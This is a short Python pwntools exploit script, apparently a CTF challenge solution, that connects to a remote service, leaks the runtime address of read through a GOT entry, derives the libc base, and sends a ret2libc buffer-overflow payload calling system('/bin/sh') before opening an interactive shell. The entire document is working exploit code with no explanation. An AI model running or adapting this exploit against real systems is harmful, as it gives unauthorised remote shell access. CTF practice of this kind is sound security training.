from pwn import *

host = 'csie.ctf.tw'
port = 10137
y = remote( host , port )


read_got = 0x804a00c  #134520844
read_offset = 0xd41c0
system_offset = 0x3a940
bin_sh_offset = 0x158e8b


y.sendafter(':',str(read_got))
y.recvuntil('0x')
read_addr = int(y.recvline().strip(),16)

libc_base = read_addr - read_offset
system = libc_base + system_offset
bin_sh_addr = libc_base + bin_sh_offset

p = 'a' * 0x3c
p += p32(system)
p += 'AAAA'
p += p32(bin_sh_addr)

y.sendline(p)

y.interactive()
